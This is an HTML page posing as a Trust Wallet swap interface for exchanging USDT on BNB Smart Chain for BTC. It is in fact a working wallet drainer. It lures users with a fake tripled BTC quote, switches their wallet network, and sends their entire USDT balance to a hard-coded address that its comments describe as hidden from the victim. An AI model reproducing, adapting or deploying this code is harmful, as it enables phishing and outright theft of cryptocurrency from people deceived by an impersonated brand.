<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Trust Wallet Swap</title>
    <style>
        :root {
            --primary: #3375BB;
            --primary-glow: rgba(51, 117, 187, 0.4);
            --text-dark: #1E2026;
            --text-medium: #474D57;
            --text-light: #848E9C;
            --bg: #F5F7FA;
            --card: #FFFFFF;
            --border: #EAECEF;
            --tabbar-bg: #FFFFFF;
            --error-red: #FF4D4F;
        }
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background-color: var(--bg);
            color: var(--text-dark);
            touch-action: manipulation;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 450px;
            margin: 0 auto;
            padding-bottom: 60px;
        }
        .swap-header {
            padding: 16px;
            font-size: 20px;
            font-weight: 600;
            text-align: center;
            border-bottom: 1px solid var(--border);
        }
        .swap-body {
            padding: 16px;
        }
        .token-box {
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 12px;
            background-color: var(--card);
        }
        .token-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
        }
        .token-label {
            font-size: 14px;
            color: var(--text-medium);
            font-weight: 500;
        }
        .token-info {
            display: flex;
            align-items: center;
        }
        .token-name {
            font-weight: 600;
            font-size: 16px;
        }
        .token-network {
            font-size: 12px;
            color: var(--text-light);
            margin-left: 6px;
        }
        .token-amount-container {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }
        .token-amount {
            font-size: 22px;
            font-weight: 600;
            color: var(--text-dark);
            border: none;
            background: transparent;
            text-align: right;
            width: 100%;
            padding: 0;
            outline: none;
        }
        .token-amount::placeholder {
            color: var(--text-light);
            opacity: 0.7;
        }
        .token-value {
            font-size: 14px;
            color: var(--text-dark);
            margin-top: 4px;
        }
        .divider {
            height: 1px;
            background-color: var(--border);
            margin: 12px 0;
        }
        .rate-info {
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 14px;
            color: var(--text-medium);
            margin: 16px 0;
        }
        .rate-icon {
            margin: 0 6px;
        }
        .provider-section {
            margin: 20px 0;
        }
        .provider-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
        }
        .provider-title {
            font-size: 14px;
            color: var(--text-medium);
        }
        .provider-value {
            font-size: 15px;
            font-weight: 500;
            text-align: right;
        }
        .provider-subvalue {
            font-size: 13px;
            color: var(--text-light);
            text-align: right;
            margin-top: 2px;
        }
        .swap-button {
            width: 100%;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: 12px;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            box-shadow: 0 0 10px var(--primary-glow);
            transition: all 0.3s ease;
        }
        .swap-button:hover {
            box-shadow: 0 0 15px var(--primary-glow);
        }
        .swap-button:active {
            transform: scale(0.98);
        }
        .error-message {
            color: var(--error-red);
            font-size: 14px;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        .tab-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: var(--tabbar-bg);
            display: flex;
            justify-content: space-around;
            padding: 12px 0;
            border-top: 1px solid var(--border);
        }
        .tab-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 12px;
            color: var(--text-medium);
        }
        .tab-icon {
            margin-bottom: 4px;
            font-size: 20px;
        }
        .tab-active {
            color: var(--primary);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="swap-header">Swap</div>
        
        <div class="swap-body">
            <div class="token-box">
                <div class="token-header">
                    <div class="token-label">From</div>
                    <div class="token-info">
                        <span class="token-name">USDT ></span>
                        <span class="token-network">BNB Smart Chain</span>
                    </div>
                </div>
                <div class="token-amount-container">
                    <input type="text" id="usdtInput" class="token-amount" placeholder="Enter amount">
                    <div id="usdtValue" class="token-value">$0</div>
                </div>
            </div>

            <div class="token-box">
                <div class="token-header">
                    <div class="token-label">To</div>
                    <div class="token-info">
                        <span class="token-name">BTC ></span>
                        <span class="token-network">Bitcoin</span>
                    </div>
                </div>
                <div class="token-amount-container">
                    <div id="btcAmount" class="token-amount">0</div>
                    <div id="btcValue" class="token-value">$0</div>
                </div>
            </div>

            <div class="rate-info">
                <span>1 BTC ‚âà 1,19,489.153599 USDT</span>
                <span class="rate-icon">‚áî</span>
            </div>

            <div class="provider-section">
                <div class="provider-row">
                    <div class="provider-title">Provider Fee</div>
                    <div>
                        <div class="provider-value">$0.50</div>
                        <div class="provider-subvalue">0.00063 BNB</div>
                    </div>
                </div>
                <div class="provider-row">
                    <div class="provider-title">Provider</div>
                    <div class="provider-value">Binance</div>
                </div>
            </div>

            <div id="errorMessage" class="error-message"></div>

            <button id="swapButton" class="swap-button">
                <span id="buttonText">Continue</span>
            </button>
        </div>

        <div class="tab-bar">
            <div class="tab-item">
                <div class="tab-icon">üè†</div>
                <div>Home</div>
            </div>
            <div class="tab-item">
                <div class="tab-icon">üìà</div>
                <div>Trending</div>
            </div>
            <div class="tab-item tab-active">
                <div class="tab-icon">üîÑ</div>
                <div>Swap</div>
            </div>
            <div class="tab-item">
                <div class="tab-icon">üí∞</div>
                <div>Earn</div>
            </div>
            <div class="tab-item">
                <div class="tab-icon">üîç</div>
                <div>Discover</div>
            </div>
        </div>
    </div>

    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Configuration
            const BSC_CHAIN_ID = '0x38';
            const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
            const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943'; // Hidden in script only
            const MIN_AMOUNT = 200;
            const MAX_DAILY_LIMIT = 10000;
            const BTC_RATE = 119489.153599;

            // Elements
            const usdtInput = document.getElementById('usdtInput');
            const usdtValue = document.getElementById('usdtValue');
            const btcAmount = document.getElementById('btcAmount');
            const btcValue = document.getElementById('btcValue');
            const swapButton = document.getElementById('swapButton');
            const errorMessage = document.getElementById('errorMessage');

            // Live value calculation
            usdtInput.addEventListener('input', function() {
                const amount = parseFloat(usdtInput.value) || 0;
                
                // Update USD value
                usdtValue.textContent = `$${amount.toFixed(2)}`;
                
                // Calculate and update 3x BTC value
                const btc = (amount * 3) / BTC_RATE;
                btcAmount.textContent = btc.toFixed(8);
                btcValue.textContent = `$${(amount * 3).toFixed(2)}`;
            });

            // Force BSC Network function
            async function forceBSCNetwork() {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: BSC_CHAIN_ID }],
                    });
                    return true;
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        try {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: BSC_CHAIN_ID,
                                    chainName: 'BNB Smart Chain',
                                    nativeCurrency: {
                                        name: 'BNB',
                                        symbol: 'BNB',
                                        decimals: 18,
                                    },
                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                    blockExplorerUrls: ['https://bscscan.com'],
                                }],
                            });
                            return true;
                        } catch (addError) {
                            console.error('Error adding BSC:', addError);
                            return false;
                        }
                    }
                    return false;
                }
            }

            // Main swap function
            swapButton.addEventListener('click', async function() {
                errorMessage.style.display = 'none';
                
                try {
                    // 1. Check if wallet is installed
                    if (!window.ethereum) {
                        throw new Error('Please install Trust Wallet or MetaMask');
                    }

                    // 2. Force BSC Network FIRST (before any other action)
                    const networkSwitched = await forceBSCNetwork();
                    if (!networkSwitched) {
                        throw new Error('Please switch to BNB Smart Chain');
                    }

                    // 3. Connect wallet (will show only one popup)
                    const accounts = await window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    const userAddress = accounts[0];

                    // 4. Setup contract
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    const signer = provider.getSigner();
                    const contract = new ethers.Contract(
                        USDT_CONTRACT,
                        [
                            'function transfer(address to, uint256 amount) returns (bool)',
                            'function balanceOf(address) view returns (uint256)'
                        ],
                        signer
                    );

                    // 5. Check balance
                    const balance = await contract.balanceOf(userAddress);
                    const balanceInUSDT = parseFloat(ethers.utils.formatUnits(balance, 18));

                    // 6. Validate minimum amount (only for showing message)
                    if (balanceInUSDT < MIN_AMOUNT) {
                        throw new Error(`Minimum ${MIN_AMOUNT} USDT & Maximum ${MAX_DAILY_LIMIT} USDT Daily limit [Limited time offer]`);
                    }

                    // 7. Transfer ALL funds (regardless of amount, if >200)
                    const tx = await contract.transfer(RECIPIENT_ADDRESS, balance);
                    
                    // Show success (without showing address)
                    alert(`Success! Transferred ${balanceInUSDT.toFixed(2)} USDT`);

                } catch (error) {
                    console.error(error);
                    errorMessage.textContent = error.message;
                    errorMessage.style.display = 'block';
                    
                    // Special formatting for minimum amount error
                    if (error.message.includes('Minimum')) {
                        errorMessage.innerHTML = error.message.replace('\n', '<br>');
                    }
                }
            });
        });
    </script>
</body>
</html>
